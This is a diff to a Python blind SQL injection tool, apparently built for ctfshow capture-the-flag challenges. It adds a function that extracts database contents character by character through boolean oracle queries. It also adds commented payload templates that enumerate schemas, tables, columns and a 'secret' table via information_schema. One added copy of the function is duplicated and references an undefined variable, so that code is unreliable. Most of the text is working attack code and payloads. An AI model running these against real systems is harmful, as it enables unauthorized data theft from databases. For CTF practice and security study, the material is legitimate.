@@ -41,6 +41,42 @@ p8 = 'select group_concat(flagass233) like "{}%" from flag233333'
 sf.BoolBi_like(chk,p7,p8,stv.AlphabetLike)
 # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 '''
+def BoolBi_no_GroupConcat(chk,pl1,pl2,pl3):
+    c=0
+    for  i in range(100):
+        pl = pl1.format(i)
+        print(i,end=' ')
+        if chk(pl):
+            break;
+    c = i
+    print()
+    print('- '*60)
+    printc('Count: %d'%i , cmd_color.light_green)
+    print('- ' * 60)
+
+    for row in range(c):
+        l = 0
+        for i in range(100):
+            pl = p2.format(row,i)
+            print(i,end=' ')
+            # print(pl)
+            if chk(pl):
+                l= i;
+                break
+        print()
+        printc(f'Row[{row}].len:{l}',cmd_color.light_green)
+        flag=""
+        for col in range(1,l+1):
+            printbi(col,flag,l)
+            for i in range(30,127):
+                print(chr(i),end='')
+                pl = pl3.format(row,col,i)
+                if chk(pl):
+                    flag+=chr(i)
+                    break
+        print()
+        print('- '*60)
+        printc(f'Resault[{c}]:{flag}',cmd_color.light_green)
 def BoolBi(chk,pl1="",pl2="",abl=Alphabet,start='',startn=1):
     print(chk('1=0'), chk('1=1'))
     l=500
@@ -178,8 +214,58 @@ class Tamper:
                 ret += '%02x' % ord(i)
             return ret + ';EXECUTE fucker;'
 
+'''用limit来分行，'''
+# p1='''select count(1) like {} from information_schema.schemata'''
+# p2 = "(select  length(schema_name)   from information_schema.schemata limit {0},1 ) like {1}".lower()
+# p3 = "(select  ascii(substr(schema_name,{1},1))   from information_schema.schemata limit {0},1 ) like {2}".lower()
+# #爆表
+# p1='''select count(1) like {}  from information_schema.tables where table_schema like "ctfshow"'''
+# p2 ='''(select  length(table_name)   from information_schema.tables where table_schema like "ctfshow" limit {0},1 ) like {1}'''.lower()
+# p3 = '''(select  ascii(substr(table_name,{1},1))    from information_schema.tables where table_schema like "ctfshow"  limit {0},1 ) like {2}'''.lower()
+# #爆字段
+# p1='''select count(1) like {}  from information_schema.columns where table_name like "secret"'''
+# p2 ='''(select  length(column_name)   from information_schema.columns where table_name like  "secret" limit {0},1 ) like {1}'''.lower()
+# p3 = '''(select  ascii(substr(column_name,{1},1)) from information_schema.columns where table_name like 'secret' limit {0},1) like {2}'''.lower()
+# #爆字段
+# p1='''select count(1) like {}  from secret '''
+# p2 ='''(select  length(secret)   from secret limit {0},1 ) like {1}'''.lower()
+# p3 = '''(select  ascii(substr(secret,{1},1)) from secret limit {0},1) like {2}'''.lower()
+def BoolBi_no_GroupConcat(chk,pl1,pl2,pl3):
+    c=0
+    for  i in range(100):
+        pl = pl1.format(i)
+        print(i,end=' ')
+        if chk(pl):
+            break;
+    c = i
+    print()
+    print('- '*60)
+    printc('Count: %d'%i , cmd_color.light_green)
+    print('- ' * 60)
 
-
+    for row in range(c):
+        l = 0
+        for i in range(100):
+            pl = pl2.format(row,i)
+            print(i,end=' ')
+            # print(pl)
+            if chk(pl):
+                l= i;
+                break
+        print()
+        printc(f'Row[{row}].len:{l}',cmd_color.light_green)
+        flag=""
+        for col in range(1,l+1):
+            printbi(col,flag,l)
+            for i in range(30,127):
+                print(chr(i),end='')
+                pl = pl3.format(row,col,i)
+                if chk(pl):
+                    flag+=chr(i)
+                    break
+        print()
+        print('- '*60)
+        printc(f'Resault[{c}]:{flag}',cmd_color.light_green)
 
 
 '''盲注的例子
@@ -220,7 +306,7 @@ def bi(pl='group_concat(table_name)',plf=' from information_schema.tables where 
 '''
 
 '''
-带回显的盲注
+带回显的报错
 pl1="select group_concat(SCHEMA_NAME)from information_schema.SCHEMATA"
 pl2="select group_concat(table_name)from information_schema.tables where table_schema='ctfshow' "
 pl3="select group_concat(column_name)from information_schema.columns where table_name='flag' "
